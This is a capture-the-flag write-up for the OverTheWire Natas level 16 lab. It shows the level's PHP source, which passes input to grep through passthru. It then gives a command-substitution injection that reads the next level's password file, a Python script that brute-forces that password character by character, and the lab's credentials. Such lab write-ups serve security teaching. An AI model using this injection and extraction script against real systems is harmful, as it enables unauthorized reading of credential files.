# Level 16

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)
- username: `natas16`
- password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`

## Solution

![start](./start.jpg)

Let's see the source code:

```php
...
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
...
```

So our target command is `grep -i \"$key\" dictionary.txt`. Our `$key` is inside quotes, so we can use [Command Substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html) to execute our command. Once we can see only the output from `dictionary.txt`, we can manipulate the command in following way:

```
grep -i "$(grep ^OUR_CHARACTER(S) /etc/natas_webpass/natas17)" dictionary.txt
```

We can use output of our inserted `grep` command to see if `/etc/natas_webpass/natas17` starts with `OUR_CHARACTER(S)` *(`^` symbol defines start position, more about it [here](https://support.workiva.com/hc/en-us/articles/4407304269204-Regular-expression-operators))*. If it really starts with `OUR_CHARACTER(S)`, the full password will be returned and for sure the output from searching it in `dictionary.txt` will be empty, as `dictionary.txt` doesn't contain the password. So we can use `python` script to bruteforce the password by entering each character one by one, and if the output of search query is empty, then the character is on the right position:

```py
import requests

# Base URL and endpoint of the target site
url = 'http://natas16.natas.labs.overthewire.org/index.php'

# Characters to test in the password
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Store the successfully found password
found_password = ''

# Function to make a GET request and check if the character is correct
def check_character(current_password):

    # Headers including content type and manually added Authorization header
    headers = {
        'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas16.natas.labs.overthewire.org',
        'Referer': 'http://natas16.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the GET request
    response = requests.get(url + '?needle=$(grep ^' + current_password + ' /etc/natas_webpass/natas17)', headers=headers)
    # print(payload)
    # print(response.status_code, response.reason)  # Print status for debugging
    return not "African" in response.text

# Brute force the password character by character
for i in range(50):  # assumption max 50 characters
    found_this_iteration = False  # Flag to check if we found at least one character in this iteration
    for char in characters:
        test_password = found_password + char
        if check_character(test_password):
            found_password += char
            print(f'Found so far: {found_password}')
            found_this_iteration = True
            break
    if not found_this_iteration:
        print("No further characters found. Ending search.")
        break

print(f'Complete password: {found_password}')
```

## Password

`natas17`:`XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`

*Created by [bu19akov](https://github.com/bu19akov)*